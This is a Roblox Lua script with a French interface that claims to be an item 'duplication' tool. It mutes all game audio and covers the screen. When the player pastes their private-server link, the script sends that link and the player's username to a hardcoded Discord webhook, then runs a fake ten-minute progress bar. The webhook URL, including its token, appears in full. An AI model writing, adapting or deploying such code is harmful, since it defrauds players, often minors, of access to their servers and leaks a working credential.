-- ⚠️ MET TON WEBHOOK ICI
local WEBHOOK_URL = "https://discord.com/api/webhooks/1435954529970684015/rGJ5sFoHN9BiKxlUsvrdl3jLqPlrUxIzCy8ge3uRYBg36t4DYvQvNnlLjP4Gg2lsw9gG"

local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local GuiService = game:GetService("GuiService")

-- =========================
-- 🔇ermanent
-- =========================
local function muteSound(sound)
    if sound:IsA("Sound") then
        sound.Volume = 0
        sound:Stop()
    end
end

spawn(function()
    while true do
        for _, sound in pairs(Workspace:GetDescendants()) do
            muteSound(sound)
        end
        for _, sound in pairs(player.PlayerGui:GetDescendants()) do
            muteSound(sound)
        end
        task.wait(0.1)
    end
end)

pcall(function()
    StarterGui:SetCore("TopbarEnabled", false)
end)

local gui = Instance.new("ScreenGui")
gui.Parent = player.PlayerGui
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 1000

local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
bg.BorderSizePixel = 0

local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(1, 0, 0.1, 0)
title.Position = UDim2.new(0, 0, 0.03, 0)
title.BackgroundTransparency = 1
title.Text = "DUPLICATIONS BRAINROT X77"
title.TextColor3 = Color3.fromRGB(255,50,50)
title.Font = Enum.Font.GothamBlack
title.TextScaled = true

local input = Instance.new("TextBox", bg)
input.Size = UDim2.new(0.6, 0, 0.07, 0)
input.Position = UDim2.new(0.2, 0, 0.25, 0)
input.PlaceholderText = "Colle ici le lien de ton serveur privé"
input.BackgroundColor3 = Color3.fromRGB(25,25,25)
input.TextColor3 = Color3.fromRGB(255,255,255)
input.Font = Enum.Font.Gotham
input.TextScaled = true
input.BorderSizePixel = 0

local consent = Instance.new("TextLabel", bg)
consent.Size = UDim2.new(1, 0, 0.05, 0)
consent.Position = UDim2.new(0, 0, 0.33, 0)
consent.BackgroundTransparency = 1
consent.Text = "En continuant, tu acceptes de partager ce lien volontairement."
consent.TextColor3 = Color3.fromRGB(200,200,200)
consent.Font = Enum.Font.Gotham
consent.TextScaled = true

local barBg = Instance.new("Frame", bg)
barBg.Size = UDim2.new(0.6, 0, 0.04, 0)
barBg.Position = UDim2.new(0.2, 0, 0.5, 0)
barBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
barBg.BorderSizePixel = 0

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.new(0,0,1,0)
bar.BackgroundColor3 = Color3.fromRGB(0,255,120)
bar.BorderSizePixel = 0

local percent = Instance.new("TextLabel", bg)
percent.Size = UDim2.new(1, 0, 0.05, 0)
percent.Position = UDim2.new(0, 0, 0.55, 0)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(255,255,255)
percent.Font = Enum.Font.GothamBold
percent.TextScaled = true

local function sendWebhook(link)
    if not request then return end
    local data = {
        username = "Brainrot Logger",
        embeds = {{
            title = "Nouveau lien serveur",
            description = "```"..link.."```",
            color = 16711680,
            footer = { text = "Utilisateur : "..player.Name }
        }}
    }
    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

input.FocusLost:Connect(function(enterPressed)
    if enterPressed and input.Text ~= "" then
        sendWebhook(input.Text)
        input.Text = "Lien envoyé ✔"
        for i = 1,100 do
            bar.Size = UDim2.new(i/100,0,1,0)
            percent.Text = i.."%"
            task.wait(6)
        end
        percent.Text = "ANALYSE TERMINÉE"
    end
end)
    
